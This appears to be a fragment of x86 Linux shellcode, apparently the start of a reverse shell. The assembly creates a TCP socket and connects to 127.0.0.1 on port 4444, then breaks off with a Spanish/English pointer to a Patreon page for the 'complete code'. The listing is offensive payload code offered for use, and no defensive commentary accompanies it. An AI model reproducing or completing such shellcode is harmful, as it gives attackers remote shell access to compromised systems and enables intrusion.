global _start

section .text

_start:

xor esi, esi

mov al, 102
inc esi
push esi
pop ebx

xor esi, esi
push esi
inc esi
push esi
inc esi
push esi

mov ecx, esp

int 0x80

xchg edx, eax

mov al, 102

push 0x0100007f
push word 0x5c11
push word 0x2

mov ecx, esp


push 0x10
push ecx
push edx

mov ecx, esp

mov bl, 0x3

int 0x80

Código completo en...
Code complete on...
https://www.patreon.com/BGPavelAng
Ayudame a seguir haciendo más de esto.

